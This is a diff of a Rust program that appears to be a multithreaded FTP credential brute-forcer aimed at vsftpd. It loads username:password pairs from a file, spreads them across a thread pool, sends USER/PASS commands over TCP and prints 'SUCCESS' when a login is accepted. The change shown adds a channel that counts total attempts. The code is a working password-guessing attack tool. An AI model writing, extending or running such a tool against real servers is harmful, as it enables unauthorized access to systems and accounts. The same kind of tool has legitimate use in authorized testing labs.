@@ -3,6 +3,7 @@ mod constants;
 use clap::Parser;
 use constants::MAX_MESSAGE_SIZE;
 use itertools::Itertools;
+use std::sync::mpsc::{channel, Receiver, Sender};
 use std::{
     fs::read_to_string,
     io::{Read, Result, Write},
@@ -30,7 +31,7 @@ fn main() -> Result<()> {
     println!("Found {:?} Credential(s)", credential_list.len());
     println!("Starting...");
     let now = Instant::now();
-    // vsftpd max conn = 5
+    // vsftpd default max conn = 5
     let pool = ThreadPool::new(4);
     let mut buffer = [0; MAX_MESSAGE_SIZE];
     let host = args.host;
@@ -41,10 +42,11 @@ fn main() -> Result<()> {
         .map(|chunk| chunk.collect())
         .collect();
     let pair = Arc::new((Mutex::new(false), Condvar::new()));
-    let pair2 = pair.clone();
+    let (sender, receiver): (Sender<u32>, Receiver<u32>) = channel();
     for cred_chunk in chunks {
         let host = host.clone();
-        let pair2 = pair2.clone();
+        let pair2 = pair.clone();
+        let sender = sender.clone();
         pool.execute(move || {
             let cred_chunk = cred_chunk.clone();
             let copied_host = host.clone();
@@ -54,7 +56,7 @@ fn main() -> Result<()> {
             // TODO retry later if not.
             if buffer[..3] == [50, 50, 48] {
                 for cred in &cred_chunk {
-                    match attempt(cred, &mut stream) {
+                    match attempt(cred, &mut stream, &sender) {
                         Ok(code) => {
                             if code == 1 {
                                 println!("------------- SUCCESS -------------");
@@ -86,6 +88,7 @@ fn main() -> Result<()> {
     while !*done {
         done = cvar.wait(done).unwrap();
     }
+    println!("Total attempts {}", receiver.try_iter().count());
     println!("Total time elapsed: {}", now.elapsed().as_secs());
     Ok(())
 }
@@ -100,8 +103,9 @@ fn read_file_lines(file_name: &str) -> Vec<String> {
     return contents.lines().map(|line| line.to_string()).collect();
 }
 
-fn attempt(credential: &str, stream: &mut TcpStream) -> Result<u8> {
+fn attempt(credential: &str, stream: &mut TcpStream, sender: &Sender<u32>) -> Result<u8> {
     if let [username, password] = &credential.split(':').take(2).collect::<Vec<&str>>()[..] {
+        sender.send(1);
         println!("attempting: {} {}", username, password);
         stream.write(format!("USER {}\r\n", username).as_bytes())?;
         let mut buffer = [0; MAX_MESSAGE_SIZE];
